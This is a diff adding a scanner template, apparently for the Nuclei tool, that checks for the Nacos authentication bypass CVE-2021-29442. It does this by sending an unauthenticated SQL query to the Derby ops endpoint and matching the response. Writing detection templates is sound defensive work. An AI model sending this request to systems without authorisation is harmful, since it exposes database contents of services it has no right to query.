@@ -1,0 +1,26 @@
+id: CVE-2021-29442
+info:
+  name: Nacos Authentication Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2021-29442
+  description: |
+    Nacos authentication bypass vulnerability allowing access to sensitive information via SQL queries.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "data"
+          - "TABLENAME"
+      - type: word
+        part: header
+        words:
+          - "json"
